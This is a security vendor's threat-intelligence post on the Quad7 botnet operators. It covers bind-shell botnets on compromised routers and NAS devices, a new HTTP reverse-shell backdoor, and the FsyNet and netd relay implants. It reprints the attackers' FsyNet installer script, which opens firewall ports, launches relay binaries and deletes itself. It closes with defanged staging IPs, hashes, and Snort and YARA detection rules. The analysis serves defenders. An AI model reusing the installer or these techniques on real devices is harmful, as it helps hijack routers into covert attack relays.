# A glimpse into the Quad7 operators' next moves and associated botnets

- **Source :** sekoia
- **URL :** https://www.sekoia.com/blog/a-glimpse-into-the-quad7-operators-next-moves-and-associated-botnets
- **Date :** 2024-09-09

---

**Authors' Note**

This blog post is the second in a series of two on the Quad7 botnet. It presents the botnets operated by the Quad7 operators and deduce their possible next moves. However, if you are new on this topic, you can read the first blog post here: [Solving the 7777 Botnet enigma: A cybersecurity quest](/blog/solving-the-7777-botnet-enigma-a-cybersecurity-quest)

## **Introduction**

Previously, we detailed our investigation on the Quad7 botnet and our live forensic methodology against a TP-LINK router to get related implants on it. Following this first publication, we continued to track this botnet activity and new clusters related to the Quad7 botnet operators.

Before our blogpost on the Quad7 botnet, we started to monitor another botnet, the alogin botnet (aka 63256 botnet) and attributed this botnet to the Quad7 botnet operators with medium confidence. On 7 August 2024, Team Cymru published a [blogpost](https://www.team-cymru.com/post/botnet-7777-are-you-betting-on-a-compromised-router) confirming the two botnets were operated by the same group as they shared some common administration servers.

Recently, we came across several staging servers, leading us to discover **new targets** , **implants** and **botnet clusters** associated with this threat actor. This new discovery allows us to have a glimpse of the Quad7 next moves as it seems that the operators are developing **HTTP reverse shells** and test **new projects** to relay their attacks instead of using simple **open socks proxies** to be more stealthy and prevent tracking.

## **The wildcard login galaxy**

As of this writing, we are aware of five different *login clusters linked to this threat actor (**alogin** , **xlogin** , **axlogin** , **rlogin** and **zylogin**), which we are temporarily referring to internally as the **Quad7 Botnet Operators**.

The Quad7 botnet (aka 7777 botnet, **xlogin** botnet) is a botnet composed of compromised **TP-Link routers** which have both TCP ports TELNET/7777 and 11288 opened. The 7777 port is the administration port hosting a bind shell with root privileges (xlogin). This bind shell is password protected. The 11288 port is the Socks5 proxy port, mostly password protected, and this proxy is used to relay **M365 accounts brute force attacks**.

The **alogin** botnet is a botnet composed of compromised **Asus routers** which have both TCP ports 63256 and 63260 opened. The TELNET/63256 port is the administration port hosting a bind shell with root privileges (alogin). This bind shell is also password protected. The SOCKS/63260 port is hosting a password protected Socks5 proxy.

According to our telemetry the alogin botnet is used to relay **brute force attempts on internet exposed services such as VPN, telnet and SSH**. However, we took these observations with a grain of salt as different threat actors can relay attacks from the same compromised assets.

While looking for alogin samples, we found one on VirusTotal, which was hosted on a staging server controlled by the Quad7 operators. This led us to discover another *login sample, named **rlogin** and used to target [**Ruckus Wireless**](https://www.ruckusnetworks.com) devices.

The bind shell of rlogin is listening on TCP port TELNET/63210. The bind shell is password protected and sometimes includes a challenge as well after the password prompt. The rlogin botnet does not seem to open a proxy port on compromised Ruckus devices. Another notable difference with the other *login botnets is the botnet size, on one hand, there is the alogin and xlogin botnets with several thousand compromised devices. On the other hand, there is the rlogin botnet, which is **composed of 213 devices as of 26 August 2024 according to Censys**. The first infections for this botnet seem relatively new, with most of the devices compromised on 16 June 2024.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5a7c4c3270826c55740_6a92a27c6568d7e2b4087b7c_6a2a7df6a3074ddacfe965a9.webp)

The others *logins are **axlogin** , which appears to be deployed on [**Axentra NAS**](https://www.crunchbase.com/organization/axentra). Although we have a sample of this shell, we have not observed it being used in the wild and **zylogin** , deployed on only **8 Zyxel VPNs appliances** according to Censys and listening on the port TELNET/3256.

Recently, we observed **a decline of the xlogin botnet** \- and since August, in the alogin botnet too. On the chart below - which stops at the end of July 2024, you can see the history trends for each botnet. Something to note is that the alogin botnet is older than announced by Shodan; the lack of visibility before June 2024 can be related to the recent indexation of the port 63256. According to the information found on Censys, some Asus routers were already infected in February 2024. Some of the alogin samples found on VirusTotal were first uploaded to the platform as early as July 2023.

![Trends of xlogin, alogin and rlogin \(Quad7 Botnet Operators\) according to Shodan and Censys data.](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5a7c4c3270826c55737_6a92a27951d97c29d2a305b3_6a2a7df5a3074ddacfe96567.webp)

Trends of xlogin, alogin and rlogin (Quad7 Botnet Operators) according to Shodan and Censys data.

It is interesting to note that during our hunting, we also observed approximately **740 ZTE routers in Morocco** with SOCKS proxies listening on port SOCKS/28629 and a Telnet authentication service on port TELNET/8899. However, since the Telnet authentication does not behave in the same manner as that deployed by the *login - and seems legit, we believe that these open socks proxies may be related to a different threat actor.

## **When the Quad7 shells start calling home…**

Beside the discovery of the new *login samples, we also found three backdoors acting as HTTP-based reverse shells, nicknamed **UPDTAE backdoor** because of a typo. These backdoors seem to be currently tested by the operators prior to deployment on compromised routers. We discovered three UPDTAE implants:

  * Two for MIPS apparently deployed on **ASUS routers** ;
  * Another one packed with UPX, for ARM and apparently to be deployed on **Axentra NAS**.



These backdoors are statically linked with the [libcurl library](https://curl.se/libcurl/), beaconing through HTTP requests every 30 seconds over HTTP with a User-Agent taking the value of IOT. The code is poorly designed with several mistakes and remains very simple.

Despite the beaconing requests and command results being sent via JSON POST requests, the commands are transmitted from the server to the infected hosts through a simple webpage with the following body content: .

  * Command 1: Update the implant C2 URL;
  * Command 3: Execute a command on the compromised device.



Below is a representation of UPDTAE backdoor communications:

!["UPDATE" reverse shell communications. Source : Sekoia TDR Blogpost - A glimpse into the Quad7 operators' next moves and associated botnets](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5a7c4c3270826c55733_6a92a27adae089660dfc1d1d_6a2a7df5a3074ddacfe96577.webp)

&quot;UPDATE&quot; reverse shell communications. Source : Sekoia TDR Blogpost - A glimpse into the Quad7 operators' next moves and associated botnets

This new development is possibly driven by the Quad7 botnet operators' **desire to remain under the radar** and avoid having a login interface on the compromised routers. This approach prevents security researchers from tracking the botnet's evolution through internet scanning engines and hinders other threat actors from **piggybacking on their accesses**. In a dedicated section at the end of this report, we provide a YARA and a generic Suricata rule to detect this new reverse shell.

## … and possibly abandon open socks proxies

### Meet FsyNet

While looking on this server, we discovered another potential move from the Quad7 threat actor to prevent the reuse / correlation. In one folder of the server there was a bash file named fsy.bin concatenated with a tarball. This bash file aimed to set up firewall rules and launch three binaries (asr_node, node-r-control, node-relay) relaying a project nicknamed “**FsyNet** ” which uses [**KCP**](https://github.com/skywind3000/kcp/blob/master/README.en.md) as a communication protocol.

Here is the installation script:

#!/bin/sh  
firewall-cmd --permanent --add-port 9999/udp  
firewall-cmd --permanent --add-port 10000-40000/tcp  
firewall-cmd --permanent --add-port 10000-40000/udp  
mkdir /tmp/fsynet  
tail -n +20 $0 >/tmp/fsynet/fsy.tar.gz  
path=`pwd`  
cd /tmp/fsynet  
tar zxf fsy.tar.gz  
chmod -R 777 /tmp/fsynet/  
sleep 1  
./asr_node  
./node-r-control  
./node-relay  
sleep 1  
cd $path  
rm -rf $0  
rm -rf /tmp/fsynet  
exit 0  


These three binaries are compiled for the MIPS architecture, developed in C++, and share the same codebase. We began our analysis with the asr_node binary (analysis of node-r-control and node-relay is still in progress) because it:

  * Opens a listener port on the network (UDP port 9999) - useful for scanning ORBs;
  * Contains the most symbols;
  * Includes noteworthy symbols such as fsy::CommandExecutor and fsy::FileSender



The binary asr_node creates and starts an instance of an fsy::CommandExecutor and fsy::FsyApplication object. As shown in the following figure, this object consists of several modules, including:

  * CommandExecutor
  * ConUdpServer
  * Two ConTcpListener
  * ConKcpClient



![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5a7c4c3270826c55730_6a92a278adf0bb92a650eda3_6a2a7df5a3074ddacfe96564.webp)

The ConUdpServer is the module that listens on port 9999 using the KCP communication protocol is used over UDP. [**Kcp**](https://github.com/skywind3000/kcp) is a Chinese library that that implements the KCP protocol, offering the same properties as TCP but provides better latency at the cost of higher bandwidth consumption.

Once the KCP layer is removed, communications are encrypted using a combination of hard-coded keys and IVs, which are either derived from data within the message or hard-coded within the code. The following figure illustrates the decryption process of a message.

![FsyNet communications decryption process.](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5a7c4c3270826c5573c_6a92a27b4b4041c69342323d_6a2a7df6a3074ddacfe9657d.webp)

FsyNet communications decryption process.

Once decrypted, the message contains another header that include several fields, like src (source), tar (target), and cmd (command), among others. For example, the ConUdpServer accepts two types of messages:

  * FSY_UDP_Verify: After verifying that the provided session key is valid, a ConTcpServer is started;
  * FSY_UDP_Request: Creates a new session key.



The different modules that can be set to listen on the network by the application use the same message format. Depending on the type of the message, these can be placed in a queue shared between all modules and processed by the CommandExecutor module. CommandExecutor is not about executing local commands but rather handling messages via the value of the cmd field in the message header. This could involve forwarding a message, updating an encryption key, using Tor, etc.

It is important to note that the initial FsyNet binary was discovered in a folder associated with Ruckus network appliances. Consequently, we scanned more than 14k Ruckus appliances indexed by Censys and found that **30 of them responded to our KCP scan** , with 4 showing no rlogin listening on them, even in Censys' history.

It is worth mentioning that these four appliances without rlogin on them have the SSL certificate C=US, ST=California, L=LA, O=LAPD, OU=Police department, CN=ROOT. This certificate can be found on 353 other IP addresses, mixing **Ruckus Wireless** and **D-LINK** network appliances, as well as dozens of VPSs residing in autonomous systems notorious for hosting malicious activities (M247, CHOOPA, xTom, BLNWX, KAOPU etc.). As of this writing, although this appears to be related to yet another botnet, we have not been able to link the use of this certificate to the Quad7 operators.

### … and Netd

In another folder named **ASUS** , we discovered a shell script called exec.sh, which is used against various vendors and network appliances such as **ASUS** , **D-LINK DIR-610** , and **Netgear R7000**. The script is designed to download files named netd and tun.ko, execute netd, and set up firewall rules. Although we were unable to download the tun.ko file, the netd binary was available for download.

It appears that the netd binary is intended to use the compromised network appliance as a relay node, this time with a fork of [**cjdroute2**](https://github.com/cjdelisle/cjdns/blob/master/client/cjdroute2.c) utilizing the [**CJDNS protocol**](https://github.com/cjdelisle/cjdns/blob/master/doc/Whitepaper.md)—a darknet protocol used to create independent networks over the internet—rather than the KCP protocol. When installed, a configuration file (netd.dat) and a file containing system-related information (sys.dat), both encrypted using **Salsa20** , are created and sent back to the attacker's server. Once in possession of **netd.dat** , the operators will be able to create a secure connection over UDP between their ORB and their C2 server to tunnel communications.

Unfortunately, unlike the FsyNet binary, **the listening UDP port is randomized for each ORB, making wide-scale scanning for compromised appliances impossible**.

## Conclusion

Edge devices continue to play a significant role in the operational infrastructures of numerous threat actors, including the Quad7 botnet operators. These devices are often targeted due to their accessibility, vulnerabilities, and their use in providing exit nodes that facilitate anonymous and distributed attacks. With many compromised devices spread across various regions, malicious actors can conceal their operations and launch attacks with minimal risk of exposure. The Quad7 operators have particularly demonstrated how these compromised devices can be exploited for tasks such as relaying brute-force attacks.

However, as highlighted in our last investigation, the **Quad7 operators have not been without mistakes**. Their early infrastructure relied heavily on open SOCKS proxies and poorly designed code, such as bind shells with hardcoded passwords, making it easier for researchers to track their botnets. Nevertheless, **they seem to be learning from their missteps and adapting their tactics**. The development of new tools, such as HTTP reverse shells and the use of more secure communication protocols like KCP, suggests they are actively working to evade detection and complicate efforts to attribute their activities. These changes indicate a shift towards more stealthy methods of operation, likely in response to increased scrutiny from security researchers and organizations.

It is critical for defenders to stay vigilant, adapt their detection methods, and continue to track these actors closely as they evolve.

## Quad7 Botnet Indicators of compromise

 _The KCP scanner and active staging servers aren’t shared publicly. If you are a national CERT or LEA, we can share the IOCs and samples with you under TLP:AMBER.Please contact tdr [ at ] sekoia [ dot ] io_

**Infrastructure**

`158.247.194[.]125:80  
45.77.44[.]119:80  
151.236.20[.]30:80  
103.140.239[.]63:80  
103.57.248[.]202:81  
[OTHERS STAGING SERVERS: on demand]  
`

**Malware**

`408152285671bbd0e6e63bd71d6abaaf asr_node  
5efc7d824851be9ec90a97d889a40d23 asr_node  
f42849076e24b7827218f7a25bc11ccc node-relay  
92093dd7ba6ae8fe34a215c4c4bd1cd4 node-relay  
e6f6a6de285d7c2361c32b1f29a6c3f6 node-r-control  
b3b09819f820a4ecd31f82f369000af2 node-r-control  
3c4b3d1480952d6ddfe434fef07054f7 fsy.bin  
cdb37db4543dde5ca2bd98a43699828f netd  
22633ef920f0093e3d720e7bbeb9fec8 netd  
d617f43163cb0f355dbf63058aa82d1d rlogin  
150d444848a02be230ed9fbf3692d226 rlogin  
43ea387b8294cc4d0baaef6d26ff7c72 rlogin  
4d9067e7cf517158337123a30a9bd0e3 alogin  
8542a3cbe232fe78baa0882736c61926 alogin  
777d6f907da38365924a0c2a12e973c5 alogin  
470c6ee61b4314721a8cc9ebafe8fef8 zylogin  
1b08725acc371f6b7d05bb72d0c2d759 axlogin  
40b5ac87ff87634c48fdd2cf64ccb66b UPDTAE backdoor  
199045538d9c139f9cf562d5b76a5cd5 UPDTAE backdoor  
4b8e97260d9ef6ca774675be682d9c8c UPDTAE backdoor  
5b0a28631ca106c31e1d5e81d8e25297 UPDTAE backdoor  
`

**UPDTAE Snort rule**

`alert tcp any any -> any any (flow:established,to_server;content:"|41 63 63 65 70 74 3A 20 2A 2F 2A 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 49 4F 54 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6A 73 6F 6E|";msg:"Quad7 UPDTAE backdoor beaconing";sid:100001999;rev:001;threshold: type limit, track by_src, count 1, seconds 180;)`

**Yara rules**

`rule unk_Quad7_UPDTAE_backdoor_strings {  
meta:  
id = "02d5394e-734c-4744-b293-1bf96bf1518c"  
version = "1.0"  
malware = "UPDTAE backdoor"  
intrusion_set = "Quad7 Botnet operators"  
description = "UPDTAE backdoor used by Quad7 operators"  
source = "Sekoia.io"  
creation_date = "2024-08-19"  
classification = "TLP:GREEN"  
hash = "40b5ac87ff87634c48fdd2cf64ccb66b"  
hash = "4b8e97260d9ef6ca774675be682d9c8c"  
strings:  
$ = "User-Agent: IOT"  
$ = "/iot/post"  
$ = "vender"  
$ = "Response: %s"  
$ = "cmdNum"  
$ = "UPDTAE"  
$ = "cmdResult"  
condition:  
uint32be(0) == 0x7f454c46 and  
filesize < 5MB and  
4 of them  
}  
  
rule unk_Quad7_wildcard_login {  
meta:  
id = "01510244-0795-4299-aa66-056a2b4682e7"  
version = "1.0"  
intrusion_set = "Quad7 Botnet operators"  
malware = "xlogin"  
description = "Detects the *login bind shells"  
source = "Sekoia.io"  
creation_date = "2024-07-18"  
classification = "TLP:CLEAR"  
hash = "4d9067e7cf517158337123a30a9bd0e3"  
hash = "43ea387b8294cc4d0baaef6d26ff7c72"  
hash = "777d6f907da38365924a0c2a12e973c5"  
hash = "8542a3cbe232fe78baa0882736c61926"  
strings:  
$string1 = { 2f 62 69 6e 2f 73 68 00 2f 74 6d 70 2f 6c 6f 67 69 6e }  
$string2 = { 2f 62 69 6e 2f 73 68 00 2d 63 00 65 78 69 74 20 30 }  
condition:  
uint32be(0) == 0x7f454c46 and  
filesize < 180KB and  
@string2 - @string1 < 3400  
}  
  
rule unk_Quad7_FsyNet_strings {  
meta:  
id = "897b2421-c177-48c0-8f5b-82d8434208cb"  
version = "1.0"  
malware = "FsyNet"  
intrusion_set = "Quad7 Botnet operators"  
description = "Matches node-r-control, asr_node, node-relay"  
source = "Sekoia.io"  
creation_date = "2024-08-20"  
classification = "TLP:GREEN"  
hash = "f42849076e24b7827218f7a25bc11ccc"  
hash = "b3b09819f820a4ecd31f82f369000af2"  
hash = "92093dd7ba6ae8fe34a215c4c4bd1cd4"  
hash = "e6f6a6de285d7c2361c32b1f29a6c3f6"  
hash = "408152285671bbd0e6e63bd71d6abaaf"  
hash = "5efc7d824851be9ec90a97d889a40d23"  
strings:  
$ = "prev_hop_port"  
$ = "next_hop_port"  
$ = "back_hop_port"  
$ = "next_tsn_port"  
$ = "prev_hop_ip"  
$ = "next_hop_ip"  
$ = "back_hop_ip"  
$ = "next_tsn_ip"  
$ = "ikcp_"  
$ = "/tmp/log_r"  
$ = "total_hop"  
condition:  
uint32be(0) == 0x7f454c46  
and filesize < 5MB  
and 6 of them  
}  
  
rule unk_Quad7_netd_strings {  
meta:  
id = "3f527f0e-c101-4356-9024-fc61aea644d1"  
version = "1.0"  
malware = "netd"  
intrusion_set = "Quad7 Botnet operators"  
description = "Matches netd binary"  
source = "Sekoia.io"  
creation_date = "2024-08-23"  
classification = "TLP:GREEN"  
hash = "cdb37db4543dde5ca2bd98a43699828f"  
hash = "22633ef920f0093e3d720e7bbeb9fec8"  
strings:  
$ = "./netd.dat"  
$ = "./sys.dat"  
$ = "--conf"  
$ = "--init"  
$ = "--nobg"  
$ = "Url is NULL."  
condition:  
uint32be(0) == 0x7f454c46 and  
filesize < 1MB and  
4 of them  
}  
`